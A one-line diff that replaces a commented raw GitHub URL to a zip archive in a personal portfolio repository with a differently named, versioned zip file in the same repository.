@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/yarrabolukittu/kittuportfolio.github.io/main/Majesta/kittuportfolio.github.io.zip
+# https://raw.githubusercontent.com/yarrabolukittu/kittuportfolio.github.io/main/Majesta/github-io-kittuportfolio-2.6.zip
